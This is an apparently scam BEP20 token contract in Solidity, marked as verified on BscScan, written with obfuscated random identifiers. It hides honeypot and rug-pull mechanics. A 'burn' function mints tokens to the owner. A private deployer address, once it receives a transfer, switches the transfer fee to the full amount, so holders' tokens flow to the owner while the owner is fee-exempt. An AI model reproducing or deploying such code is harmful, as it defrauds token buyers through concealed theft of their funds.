/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13 18:48
 */
pragma solidity >=0.4.11;
contract jOrhaC {
uint256 public constant HnMkdi = 9+1;
string public  symbol = "bkLjaR";
uint256 private  ddKdjh = 10000000000000;
uint256 public  dOIjCF = 10000000000000000;
address public  GDVPXz = address(0);
uint256 public  bvSnjT = 10000000000000000000;
address private  gigweJ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  jpREdK = 100000000000000000000000;
uint256 public  MOObuI = 10000000000000000000000000000;
address public  WxbkSG = address(0);
uint8 public constant decimals = 18;
uint256 public  Wpyvnv = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  ADqZem = 100000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  litnDs = address(0);
uint256 public  rYEdAi = 100000000000000000;
address public  CEhGMR = address(0);
uint256 public  jEBAmL = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
address public owner;
address public  njVBTk = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  BHaJMx = address(0);
string public  name = "FueEzC";
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "EzUcgZ");
require(to != address(0), "EzUcgZ");
require(amount <= balanceOf[from], "EzUcgZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HnMkdi/ddKdjh ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==gigweJ){
ddKdjh = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
gigweJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}